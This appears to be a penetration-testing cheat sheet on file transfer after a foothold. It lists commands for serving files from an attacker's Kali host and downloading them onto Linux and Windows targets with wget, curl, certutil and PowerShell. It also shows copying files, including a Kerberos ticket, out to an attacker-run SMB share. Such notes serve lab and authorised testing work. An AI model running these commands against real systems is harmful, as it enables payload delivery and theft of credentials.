# File transfer

[← Foothold quick reference](../02-foothold.md)

Verify received length/checksum before execution.

```bash
python3 -m http.server 8000
impacket-smbserver share /path/to/files -smb2support
```

Linux target:

```bash
wget http://<kali-ip>:8000/file -O /tmp/file
curl http://<kali-ip>:8000/file -o /tmp/file
```

Windows target:

```powershell
certutil -urlcache -split -f http://<kali-ip>:8000/file.exe file.exe
Invoke-WebRequest http://<kali-ip>:8000/file.exe -OutFile file.exe
```

## Authenticated SMB share

Kali SMB share:

```bash
sudo impacket-smbserver share . -smb2support -user <share-user> -password '<share-password>'
```

Windows → named share:

```cmd
net use \\<KALI-IP>\share /user:<share-user> <share-password>
copy C:\Temp\file.bin \\<KALI-IP>\share\file.bin
```

`net view \\<KALI-IP>` lists shares; verify write and copied file.

## PowerShell paths containing brackets

Ticket filename contains `[`/`]`: use PowerShell `-LiteralPath`:

```powershell
Copy-Item -LiteralPath 'C:\Temp\[ticket-id]-user@service.kirbi' `
  -Destination '\\<KALI-IP>\share\ticket.kirbi' -ErrorAction Stop
Test-Path -LiteralPath '\\<KALI-IP>\share\ticket.kirbi'
```

`/dev/tcp` HTTP transfer includes headers; strip them and verify checksum.
